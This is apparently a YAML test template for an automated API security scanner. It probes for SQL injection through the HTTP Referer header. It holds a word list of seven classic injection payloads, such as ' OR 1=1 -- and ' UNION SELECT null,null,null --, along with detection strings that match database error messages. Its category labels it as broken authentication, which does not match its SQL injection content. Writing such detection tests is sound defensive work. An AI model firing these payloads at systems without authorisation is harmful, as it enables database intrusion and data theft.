id: SQL_INJECTION_REFERER_HEADER
info:
  name: "SQL Injection test on Referer Header"
  description: > 
    "SQL Injection testing on the Referer header involves assessing web applications for vulnerabilities where the Referer HTTP header is improperly sanitized or directly used in SQL queries. Attackers manipulate the Referer header to inject malicious SQL commands, aiming to exploit backend databases like MySQL. This test helps uncover and mitigate security weaknesses by identifying potential injection points where user-supplied header data is processed without adequate validation."
  details: >
    "SQL Injection testing on the Referer header focuses on identifying vulnerabilities in web applications that arise from improperly handling or sanitizing the Referer HTTP header. Attackers exploit this by injecting SQL queries into the Referer header, potentially compromising the backend MySQL database. The test aims to reveal weaknesses in input validation and query execution, helping to secure the application against unauthorized access and data manipulation through header-based SQL injection attacks."
  impact: >
    "The impact of SQL Injection through the Referer header can be severe, compromising the security and integrity of the web application's backend database. Successful exploitation allows attackers to execute unauthorized SQL commands, leading to data breaches, data manipulation, or deletion within the MySQL database. This can result in loss of sensitive information, disruption of services, potential financial loss, and damage to the organization's reputation."

  category:
    name: NO_AUTH
    shortName: Broken Authentication
    displayName: Broken User Authentication (BUA)
  subCategory: SQL_INJECTION_REFERER_HEADER
  severity: MEDIUM
  tags:
    - Business logic
    - OWASP top 10
    - HackerOne top 10
  references:
    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/"
    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa2-broken-authentication.md"
    - "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
  cwe:
    - CWE-287
  cve:
    - CVE-2020-24008
    - CVE-2021-45901

api_selection_filters:
  response_code:
    gte: 200
    lt: 300
  response_payload:
    length:
      gt: 0
    not_contains_either:
      - Error
      - Internal Server 
      - Failed
      - Unauthorized
      - access denied
      - Forbidden
      - Method Not allowed
      - Gateway timeout
      - request timeout
      - server error
      - server busy
      - authentication error
      - authorization error
      - validation error
      - Permission Denied
      - invalid token
      - token expired
      - session expired
      - session timeout
      - unexpected error
      - unable to process request
      - bad request
      - service unavailable
      - account is locked
      - account is blocked
      - multiple failed attempts
  request_headers:
    for_one:
      key:
        regex: "^Referer$|^referer$"
        extract: userKey
      value:
        extract: userVal
wordLists:
  refererPayloads:
    - "' OR '1'='1"
    - "' OR 1=1 --"
    - "' OR 'x'='x"
    - "' OR 1=1 LIMIT 1 --"
    - "' UNION SELECT null,null,null --"
    - "' AND 1=0 --"
    - "'; SELECT 1; --"

execute:
  type: single
  requests:
  - req:
    - modify_header:
        userKey: ${userVal}${refererPayloads}
        
validate:
  or:
    - response_payload:
        length:
          gt: 0
        contains_either:
          - SQL syntax
          - MySQL
          - mysqli
          - MySQLSyntaxErrorException
          - Mysqli_Exception
          - MySqlException
          - SQLSTATE
          - PostgreSQL
          - valid PostgreSQL result
          - Npgsql
          - PSQLException
          - SQL Server
          - SQLServer JDBC Driver
          - SqlConnection
          - SqlException
          - Oracle error
          - quoted string not properly terminated
          - OracleException
          - SQLite
          - SQLITE_ERROR
          - "sqlite3.OperationalError:"
          - "SQLite3::SQLException"
          - "SQLiteException"
          - "SQLITE_CONSTRAINT"
    - response_headers:
        for_one:
          key:
            regex: .*
          value:
            contains_either:
              - "' OR '1'='1"
              - "' OR 1=1 --"
              - "' OR 'x'='x"
              - "' OR 1=1 LIMIT 1 --"
              - "' UNION SELECT null,null,null --"
              - "' AND 1=0 --"
              - "'; SELECT 1; --" 